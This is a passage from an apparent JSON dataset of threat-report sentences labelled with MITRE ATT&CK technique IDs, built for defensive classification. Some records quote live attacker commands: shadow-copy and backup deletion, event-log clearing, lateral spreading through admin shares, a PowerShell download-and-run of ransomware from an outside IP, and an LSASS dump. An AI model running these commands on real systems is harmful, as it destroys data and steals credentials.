    "text": "/Quiet bcdedit /set {default} recoveryenabled no wmic shadowcopy delete wbadmin delete backup wbadmin delete systemstatebackup -keepversions:0 bcdedit /set {default} bootstatuspolicy ignoreallfailures bcdedit /set {default} recoveryenabled no wevtutil.exe clear-log Application wevtutil.exe clear-log Security wevtutil.exe clear-log System wbadmin delete catalog -quiet wbadmin delete catalog -quiet wbadmin delete systemstatebackup ",
    "command": "",
    "labels": [
      "T1047",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It then looks for and stops the following processes: agntsvc.exe agntsvc.exe agntsvc.exe agntsvc.exe dbeng50.exe dbsnmp.exe encsvc.exe excel.exe firefoxconfig.exe infopath.exe isqlplussvc.exe msaccess.exe msftesql.exe mspub.exe mydesktopqos.exe mydesktopservice.exe mysqld-nt.exe mysqld-opt.exe mysqld.exe notepad++.exe notepad.exe ocautoupds.exe ocomm.exe ocssd.exe onenote.exe oracle.exe outlook.exe powerpnt.exe sqbcoreservice.exe sqlagent.exe sqlbrowser.exe sqlservr.exe sqlwriter.exe steam.exe synctime.exe tbirdconfig.exe thebat.exe thebat64.exe thunderbird.exe visio.exe winword.exe wordpad.exe xfssvccon.exe Then the malware gets a list of connected disks and starts recursive traversal of directories, skipping a few of them: C:\\Windows C:\\Program Files C:\\Program Files (x86) C:\\ProgramData C:\\Python $SysReset $Recycle.",
    "command": "",
    "labels": [
      "T1057",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Then it sends an HTTP POST request with the name of the victim's computer to a server at hxxp://www.therockbrazil.com.br/assinaturas/logs.php. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Remember that at the end, the malware deletes the intermediate DLL library and encrypted ransomware, but not the legitimate executable file whose process is used for performing the malicious actions.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "%%i in (c:\\programdata\\list.txt) do ( net use \\\\%%i\\c$ \"*\" /u:*\\administrator copy c:\\programdata\\vmnat.exe \\\\%%i\\c$\\windows\\system32\\vmnat.exe SCHTASKS /Create /S",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "* /tr \"cmd.exe /c start c:\\windows\\system32\\vmnat.exe\" /sc",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "onstart /RU SYSTEM schtasks /run",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "*\\administrator /p \"*\" /tn * net use \\\\%%i\\c$ /del net use * /del /Y ) del vmnat.exe del list.txt del work.bat ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "%%i in (c:\\programdata\\list.txt) do ( net use \\\\%%i\\c$ \"*\" /u:*\\* if not errorlevel 1 ( del \\\\%%i\\c$\\programdata\\GameuxInstallHelper.dll del \\\\%%i\\c$\\programdata\\GDFInstall.exe del \\\\%%i\\c$\\programdata\\Sysurl.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Authors: Denis Goydenko and Alexey Vishnyakov, Positive Technologies MITRE TTPs Tactic ID Name Initial Access T1190 Exploit Public-Facing Application T1199 Trusted Relationship Execution T1059 Command and Scripting Interpreter:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Windows Command Shell T1053 Scheduled Task/Job: Scheduled Task T1047 Windows Management Instrumentation Persistence T1547 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1574 Hijack Execution Flow: DLL Search Order Hijacking T1053 Scheduled Task/Job: Scheduled Task T1078 Valid Accounts: Domain Accounts T1078 Valid Accounts: Default Accounts Privilege Escalation T1068 Exploitation for Privilege Escalation Defense Evasion T1140 Deobfuscate/Decode Files or Information T1070 Indicator Removal on Host: Clear Windows Event Logs T1070 Indicator Removal on Host: File Deletion T1070 Indicator Removal on Host: Timestomp Credential Access T1003 OS Credential Dumping: LSASS Memory Discovery T1087 Account Discovery: Domain Account T1082 System Information Discovery T1049 System Network Connections Discovery Lateral Movement T1210 Exploitation of Remote Services T1570 Lateral Tool Transfer T1021 Remote Services: SMB/Windows Admin Shares Collection T1560 Archive Collected Data: Archive via Utility T1005 Data from Local System T1119 Automated Collection T1039 Data from Network Shared Drive Command and Control T1071 Application Layer Protocol: Web Protocols T1132 Data Encoding: Standard Encoding T1573 Encrypted Channel:",
    "command": "",
    "labels": [
      "T1003.001",
      "T1005",
      "T1016",
      "T1047",
      "T1053.005",
      "T1059.003",
      "T1071.001",
      "T1078",
      "T1082",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The LNK files make web requests to actor-controlled domains and IP addresses to download additional malicious files such as MSI files containing DLLs or executables, VBScript files containing PowerShell commands, or deceptive PDFs. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Unpacked file names referencing tax documents in the malware In some cases, GuLoader was used to execute shellcode and subsequently download Remcos on the target system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Functions are always the same – dedicated to reading the file from the disk: CreateFileW, GetTempPathW, lstrcatW, ReadFile, VirtualAlloc, GetTempPathW.The function GetTempPathW is used to retrieve the path to the %TEMP% directory, where all the components from the archive were automatically extracted at runtime of the NSIS fileThe name of the next file is concatenated to the the %TEMP% pathMemory is allocated for the file content, and the file is read into this bufferA custom decryption algorithm is being applied on the buffer (the algorithm is different for different samples).",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Loading PE After the PE is decrypted, the function for its loading is deployed. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The payload is implanted into a newly created suspended process (a new instance of the current executable) using one of the most popular techniques of PE injection: Process Hollowing (a.k.a. RunPE).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The content of the payload is mapped into the new process using low level APIs: NtCreateSection, NtMapViewOfSection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The PE loading function makes a use of the following set: The low-level functions, directly related with performing the injection, are called via raw syscalls retrieved directly from NTDLL.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "By extracting the syscalls, and executing them manually, the malware can use the API of the operating system, without a need of calling functions from the DLL.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Second, we can see a check against blacklisted processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Figure 2 – malicious document Upon opening the malicious document, it attempts to establish a connection with the remote server to retrieve the subsequent component of the attack.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This enables the document to fetch the .dotm file from the remote server required for further actions.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Figure 4 – settings.xml.rels file content Once a successful connection to the remote server is established, a malicious template file is downloaded and executed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Figure 5 – De-obfuscated macro content The VBA script incorporates a PowerShell command mentioned below to trigger the retrieval of the final stage payload, which is an executable file named “tinytask.exe” from the remote server. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Following the successful download, the script saves the obtained payload in the directory “C:\\Users\\Public\\456trytgre3e45yrthtgr.exe” on the compromised system and proceeds to execute it. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "“cmd /c powershell/W 01 curl hxxp://91[.]107[.]210[.]207/tinytask.exe -o C:\\Users\\Public\\456trytgre3e45yrthtgr.exe; C:\\Users\\Public\\456trytgre3e45yrthtgr.exe” The downloaded payload is Lockbit ransomware 2.0. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "CLFS and Transaction Files PRIVATELOG and STASHLOG rely on the Common Log File System (CLFS) to hide a second stage payload in registry transaction files. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "It provides applications with API functions—available in clfsw32.dll—to create, store and read log data. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This provides attackers with an opportunity to hide their data as log records in a convenient way, because these are accessible through API functions. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This is similar in nature to malware which may rely, for example, on the Windows Registry or NTFS Extended Attributes to hide their data, which also provide locations to store and retrieve binary data with the Windows API. ",
    "command": "",
    "labels": [
      "T1106",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "These allow applications to perform a number of changes on the filesystem or registry, all grouped in a single transaction that can be committed or rolled back.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "For example, to open a registry key in a transaction, the functions RegCreateKeyTransacted(), RegOpenKeyTransacted(), and RegDeleteKeyTransacted() are available. ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Figure 2: Graph view of main() STASHLOG has two different modes of operation: Without any arguments, during which it will prepare the environment With a single argument, which is a file that should be hidden in a CLFS file Preparing the Environment Executed without arguments, the installer prints two values to the console: The GUID returned from the registry value of HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGUID A 56-byte value derived from a randomly generated GUID with CoCreateGUID() Figure 3: Sample console output The 56-byte value is a concatenation of the random GUID, its SHA1 hash, and the SHA1 hash of the previous values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "The malware also checks that the operating system version is within a lower and upper boundary and that the SHA1 hash of the decrypted data matches the payload header value at offset 20. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Each block header has the following structure: struct blockHeader { DWORD magic; DWORD blockSize; } Once the malware has checked and validated the structure of the payload, it searches for .blf files in the default user’s profile directory and uses the .blf file with the oldest creation date timestamp. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "In practice, the malware should typically find the file used for registry transaction logs: C:\\Users\\Default\\NTUSER.DAT<GUID>.TM.blf If a matching .blf file is indeed found, it is opened with the CreateLogFile() API from clfsw32.dll.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The IV is the first 16-bytes of the SHA1 hash of the concatenated GUIDs from: GetVolumeNameForVolumeMountPointW() The registry value HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGUID The contents are written to the CLFS log file using the clfsw32.dll API function ReserveAndAppendLog().",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "If this matches, the malware resolves the function address for the ServiceMain export function of PrintConfig.dll, which is the service entry point of the service using this command line.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This function is patched using Microsoft Detours—a publicly available library used for instrumenting Win32 functions—so that the execution flow appears to happen in the legitimate service DLL. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Similarly to STASHLOG, PRIVATELOG starts by enumerating *.blf files in the default user’s profile directory and uses the .blf file with the oldest creation date timestamp. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The injection process is similar to Phantom DLL hollowing and is described as follows: Open a transacted handle to a copied file via the API CreateFileTransactedA() ",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Overwrite the transacted file with the decrypted payload contents Create a section backed by the transacted file with SEC_IMAGE attributes via the API NtCreateSection() Map a view of the newly created section This implicitly loads the transacted file data to some degree.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "DonPAPI is used to search machines for certain files known to be DPAPI blobs, including Wi-Fi keys, RDP passwords,",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "To avoid the risk of detection by antivirus (AVs) or endpoint detection and response (EDR), the tool downloads the files and decrypts them locally.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "We also observed the threat actor using additional tools, including LaZagne to recover credentials stored locally and Mimikatz to steal credentials from host memory. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "During encryption, Ransom Cartel specifically seeks out files with the following file extensions: .log, .vmdk, .vmem, .vswp and .vmsn.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The DllEntryPoint leads to a function that iterates over a call to the Curve25519 Donna algorithm 24 times.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "If this value is anything other than 0, the ransomware will proceed to spawn another instance of itself via rundll32.exe, specifying the Rathbuige export. ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Following decryption of the configuration, certain system information is gathered, including the username, computer name, domain name, locale and product name.",
    "command": "",
    "labels": [
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Once encrypted, it is written to the registry key SOFTWARE\\\\Google_Authenticator\\\\b52dKMhj, with the sample first attempting to write to the HKEY_LOCAL_MACHINE hive, before writing to HKEY_CURRENT_USER if the right permissions are not possessed.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Once the data has been written to the registry, it is then base64-encoded and embedded within the ransom note, replacing the {KEY} placeholder. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Once the configuration has been parsed and stored within the registry, the command line provided to the ransomware is parsed.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "There are a total of five possible arguments, as shown in Table 7. Argument Description -nolan Instruct the sample not to attempt any form of network drive encryption -nolocal Prevent the encryption of all local volumes -path Target specific file path to encrypt -silent Appears to instruct the ransomware to avoid terminating running processes and services, and it begins encrypting files immediately -smode Causes the ransomware to use BCEdit in order to enable Safe Boot; check out this article on REvil’s use of “Windows Safe Mode” encryption for a discussion about this particular technique. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Ransom Cartel first checks to see if the registry already contains previously generated values; if so, it will read those values into memory.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Once the session secrets have been generated, they are written to the registry, alongside session_public_1 and attacker_cfg_public. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Valid Accounts Uses legitimate VPN, RDP, Citrix or VNC credentials to maintain access to an environment. T1133.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell Uses PowerShell to retrieve the malicious payload and download additional resources such as Mimikatz and Rclone. T1059.003 Command and Scripting Interpreter:",
    "command": "",
    "labels": [
      "T1003.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Windows Command Shell Uses cmd.exe to execute commands. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder Adds registry run keys to achieve persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "In some cases, we observed using the following command: start cmd.exe /k runonce.exe /AlternateShellStartup T1197.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "BITS Jobs Uses BITSAdmin to download and install payloads. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Modify Registry Modifies the Registry to disable UAC remote restrictions by setting SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy to 1. T1070.001 Indicator Removal on Host: Clear Windows Event Logs Uses wevtutil to clear the Windows event logs. ",
    "command": "",
    "labels": [
      "T1112",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "System Binary Proxy Execution: Rundll32 Uses Rundll32 to load and execute malicious DLL. T1562.004.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Indicator Removal on Host: File Deletion Deletes some of its files used during operations as part of cleanup, including removing applications such as 7z.exe, tor.exe, ssh.exe T1070.003.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "OS Credential Dumping: LSASS Memory Uses Mimikatz to harvest credentials. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "File and Directory Discovery Searches for specific files prior to encryption. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Ingress Tool Transfer Downloads and uploads files to and from the victim’s machine. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "At this point, the threat actors had the clear text credentials for one of the domain administrator accounts and began moving lateral to other systems.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After an hour or so of failures, the threat actors proceeded to RDP to the domain controller.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Once there, they then loaded textbin[.]net, a pastebin style site, to download Cobalt Strike PowerShell code to the host in a file named pon.txt. Trying to execute this locally failed as well, and the threat actor moved on to downloading a variety of beacon executables (e.g. lsass.exe, lsasss.exe, etc.).",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Malicious ISO file First, the user clicked on the ISO file, which created a new virtual hard drive disk.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "As we can see below using LECmd from Eric Zimmerman, the file documents.lnk points to max\\eyewear.bat. As a consequence, when the victim clicked on the LNK file, it triggered the execution of the batch file eyewear.bat The batch file eyewear.bat then executed two commands: It first moved a DLL file named eyewear.dat, initially located in a hidden folder named max, to the user’s AppData\\Local\\Temp\\ folder : C:\\Windows\\system32\\cmd.exe /c",
    "command": "",
    "labels": [
      "T1059.003",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Then, DLL was executed using rundll32.exe : C:\\Windows\\system32\\cmd.exe /c",
    "command": "",
    "labels": [
      "T1059.003",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "As seen in the screenshot below, GetSystem creates a service and connects to a pipe. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Windows Defender tampering On one host, the threat actors ran the following command to try and clear the way for their activity, likely due to the difficulty the threat actors were having with beacons crashing. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUI This command was downloaded from a remote site to a file named pon!.txt and then executed locally. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "As a result, we observed abnormal winlogon.exe process behavior, winlogon.exe performed DNS requests (Sysmon event ID 22) to a Cobalt Strike C2 domain guteyutu[.]com. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "There were several variants of Mimikatz in binary and PowerShell form: \"C:\\ProgramData\\mimikatz.exe\" \"C:\\ProgramData\\mimikatz.exe.exe\" \"C:\\ProgramData\\mimikatz_cryptovanniy.exe\" \"C:\\ProgramData\\notepad.exe\" \"C:\\ProgramData\\katz.ps1 Commands used to collect credentials and export to text files stored in the C:\\ProgramData folder included the following: C:\\Windows\\system32\\cmd.exe /C",
    "command": "",
    "labels": [
      "T1003.001",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It is likely the operator used the Cobalt Strike DCSync command, having observed them already enter this directly in the host OS command shell. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "For additional details, SpecterOps has an article covering the DCSync technique. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Code injection in LSASS Multiple injections into the LSASS process were observed on multiple hosts. ",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Process dump of the LSASS process was undertaken using the Sysinternals ProcDump utility: This process was invoked by RunDLL32.exe which was an injected Cobalt Strike beacon reaching out to the command and control server at 111.90.143[.]191. ",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\SysWOW64\\rundll32.exe ➝ c:\\windows\\temp\\procdump64.exe -accepteula -ma lsass.exe fwtsqmfile00.dmp Classic ransomware discovery stages ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "From the IcedID malware running via Rundll32, the following LOLBAS commands were observed: rundll32 C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\easygoing.dat,#1 ➝ nltest /domain_trusts",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "➝ cmd.exe /c",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "chcp >&2 ➝ ipconfig /all ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Discovery commands observed from other Cobalt Strike beacons using LOLBAS included: systeminfo netstat -anop tcp cmd.exe /C",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "In addition, threat actors searched for Active Directory related DLLs in other directories: C:\\Windows\\system32\\cmd.exe /C",
    "command": "",
    "labels": [
      "T1059.003",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "An example of an incorrect named command was nslook up (should have been nslookup) that also incorrectly passed the username, instead of the host name. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Further examples included typos of commands: C:\\Windows\\system32\\cmd.exe /C",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Reviewing the WebCacheV01.dat on the domain controllers, reveals more details on the sites loaded, including the files that where downloaded from those sites: The threat actors downloaded the lsass.exe beacon from their attacker hosted infrastructure at 199.127.60[.]117. ",
    "command": "",
    "labels": [
      "T1003.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In this case, there is a clear indication that the operator launched the Invoke-ShareFinder command via Cobalt Strike, as observed in Event ID 800: Windows Security Logs discovery Once the threat actors had achieved privilege escalation by compromising administrator accounts, an unusual, but interesting discovery technique was observed as seen below. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Unit42 (PaloAlto) provides a good article on trends and observations of PowerShell encoded commands: Decoding this again using CyberChef shows the resulting PowerShell script: Lots of custom scripts dropped by threat actors Other tools and scripts were dropped onto one endpoint: ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "While Adget was seen used, prior to that tool being run the threat actors also deployed the tried and true AdFind, which was renamed to find.exe and called using find.bat. Another batch file named ‘AD.bat’ was dropped into the ProgramData folder on one host and used adfind to enumerate AD objects. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Its likely the code was reused from other open source pentest enumerations scripts available, such as: WMIC The use of WMIC was leveraged by a batch file named dS.bat that queried a number of target hosts to determine the host disk drive configuration.",
    "command": "",
    "labels": [
      "T1047",
      "T1059.003",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "WMI Threat actors used the lolbin wmic.exe in order to execute PowerShell Cobalt Strike beacons on multiple workstations and servers.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Proxying RDP traffic via a processes such as a Cobalt Strike beacon reduces the exposure of the threat actor’s own infrastructure, and blends RDP activity to those of internal hosts on the network. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The use of RDP was extensively used throughout the intrusion, using a variety of processes (beacon injected or standalone). ",
    "command": "",
    "labels": [
      "T1021.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The common processes observed were two injected processes, and the Nigu.exe/lsass.exe. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Collection To achieve collection of various directories on multiple hosts, the threat actors used the dir command through the administrative share c$ and redirected the output to a file text named listing.txt. C:\\Windows\\System32\\cmd.exe",
    "command": "",
    "labels": [
      "T1059.003",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The AnyDesk service password was set manually using the command line as shown below: ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "-NoProfile --> C:\\Windows\\system32\\cmd.exe /C cmd.exe /c",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Ransomware ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then tried again on a different server using a DLL this time: rundll32 locker_32.dll,run /[email protected] Again, only execution on the server was observed.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile ➝ C:\\Windows\\system32\\cmd.exe /C",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "locker_64.exe They then opened an RDP connection back to the primary domain controller and proceeded to try to execute the binary with a target list again.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "After only affecting the single host, the threat actors dropped several batch scripts on the server: pass.bat 1.bat 2.bat The script pass.bat proceeded to reset all the user accounts in the domain to a single password set by the threat actors. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Finally 2.bat used the reset password to enable psexec to execute the ransomware on all the remote hosts. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The following Locker files were then deleted: Diamond Model Atomic IcedID: alockajilly.com zoomersoidfor.com choifejuce.lol opiransiuera.com erinindiaka.quest opiransiuera.com zoomersoidfor.com considerf.info antiflamez.bar www.onlinecloud.cloud 64.227.12.180:80 5.196.103.145:443 66.63.188.70:443 178.128.85.30:443 5.252.177.10:443 46.101.19.119:443 Cobalt Strike: fazehotafa.com guteyutu.com 45.66.151.109 172.93.181.165 111.90.143.191 78.128.112.139 Mega User: ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "In addition, its rootkit loads a fresh copy of ntdll.dll, which makes it harder to detect by Endpoint Detection & Response (EDR) solutions that hook into it to detect process injections. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The RAT employs anti-debugging techniques by leveraging Windows Management Instrumentation (WMI) to identify the system’s manufacturer.",
    "command": "",
    "labels": [
      "T1047",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Execution analysis When the malicious payload is delivered to the victim, commonly through a phishing mail or a Discord channel – the victim often receives a ZIP file containing a benign file in plain sight, and the heavily obfuscated batch file is hidden and automatically executed when launched.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The bat file format is always very similar and looks like the contents of Figure 4, followed by base64 encoded text later in the file. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "For this purpose, the script creates the folder “C:Windows System32”, with a space after Windows and deletes it as soon as the utility is running.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This rootkit supports both x32 and x64 Windows processes and has the following features: Fileless persistence: The rootkit is stored as obfuscated data in the registry and is spawned with PowerShell via Task Scheduler to be injected into the winlogon.exe process. ",
    "command": "",
    "labels": [
      "T1053.005",
      "T1055",
      "T1059.003",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The added malware will be decompressed and decrypted before it is injected into other processes. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In memory process injection: the rootkit injects itself and additional malware(s) into all processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Hooking: Hooks several functions from ntdll.dll to hide its presence. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "DLL unhooking: Removes EDR hooks by loading a fresh copy of “ntdll.dll” from disk to avoid process hollowing detection Hiding entities: Hiding all entities starts with a configurable prefix, which in SeroXen’s case its “$sxr”.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The InstallStager service is responsible for: Creating a registry key to store the malware code and writes it as encrypted data. ",
    "command": "",
    "labels": [
      "T1053.005",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Creating a scheduled task to execute the malware using PowerShell.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell will decompress and decrypt the final payload (Service) that will be injected into the winlogon.exe process and executed via dllhost.exe using process hollowing techniques. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The service kicks off the load of the rootkit’s DLL that is embedded as a resource and saves its configuration as a registry key.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The service creates 3 listener threads: NewProcessListener: Enumerates all running processes and injects the rootkit when new processes are created. ",
    "command": "",
    "labels": [
      "T1055",
      "T1057"
    ]
  },
  {
    "type": "text",
